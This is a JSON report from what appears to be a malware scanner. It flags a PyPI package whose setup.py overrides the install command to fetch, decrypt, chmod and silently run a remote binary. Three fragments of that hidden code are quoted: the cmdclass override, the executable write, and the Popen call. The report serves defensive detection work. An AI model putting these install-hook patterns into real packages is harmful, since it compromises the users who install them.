{
  "package_name": "86b629fe7d5874c06985a00786090d5a019cf84a",
  "total_matches": 3,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/86b629fe7d5874c06985a00786090d5a019cf84a/setup.py",
      "file_name": "setup.py",
      "detection_count": 3,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple hallmarks of malicious behavior, especially those associated with supply chain attacks in Python packages. Key indicators include: (1) A custom setuptools install command (hHnDjQikOlFnGdfFRvdUiQcTnWseSALL) that executes code during package installation, a classic supply chain attack vector. (2) The code enumerates user directories (using a glob pattern over /Users/Shared), and for each match, it performs cryptographic checks and, if a condition is met, proceeds to download a remote payload. (3) The payload URLs are obfuscated and decrypted at runtime, and the payload is fetched using requests, then decrypted and written as an executable file to ~/.local/bin/calendar_extender. (4) The code sets executable permissions on the file and immediately executes it via subprocess.Popen, suppressing output. (5) The use of obfuscated variable names, encrypted payloads, and dynamic decryption of URLs and binaries is a strong indicator of intent to evade detection. (6) There is no user notification, documentation, or legitimate business logic for these actions. (7) The code is triggered automatically during installation, without user consent. All these behaviors are strongly associated with malware, particularly supply chain attacks that deliver and execute remote payloads on victim systems.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "66",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(name='gqc02ee0ym09kxoc', version='1.0.0', license='MIT', cmdclass={\n'install': hHnDjQikOlFnGdfFRvdUiQcTnWseSALL})",
          "full_match": "* This package is overwriting the 'install' command in setup.py at setup.py:66",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/86b629fe7d5874c06985a00786090d5a019cf84a/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "47",
          "type_description": "download-executable: found 1 source code matches",
          "code_snippet": "with open(KOzuWQotFJDxPWhEoAXUiPgYFnFVbOeK, 'wb') as f:\nf.write(bytes(out))\nos.chmod(KOzuWQotFJDxPWhEoAXUiPgYFnFVbOeK, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat\n.S_IXGRP)",
          "full_match": "* This package is downloading making executable a remote binary at setup.py:47",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/86b629fe7d5874c06985a00786090d5a019cf84a/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "53",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "subprocess.Popen([KOzuWQotFJDxPWhEoAXUiPgYFnFVbOeK], stdout=subprocess.DEVNULL, stderr=\nsubprocess.STDOUT)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:53",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/86b629fe7d5874c06985a00786090d5a019cf84a/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}